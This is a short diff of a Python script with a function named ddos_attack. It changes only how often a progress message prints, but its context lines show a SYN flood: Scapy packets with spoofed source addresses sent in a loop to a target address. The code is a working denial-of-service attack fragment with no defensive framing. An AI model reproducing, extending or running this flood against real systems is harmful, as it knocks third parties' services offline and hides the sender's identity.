@@ -18,7 +18,7 @@ def ddos_attack():
         packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=dport, flags="S")
         send(packet, inter=0.001, count=1, verbose=0)
         sent_packets += 1
-        if sent_packets % 1000 == 0:
+        if sent_packets % 500 == 0:
             print(f"Sent {sent_packets} packets")
 
 if __name__ == "__main__":
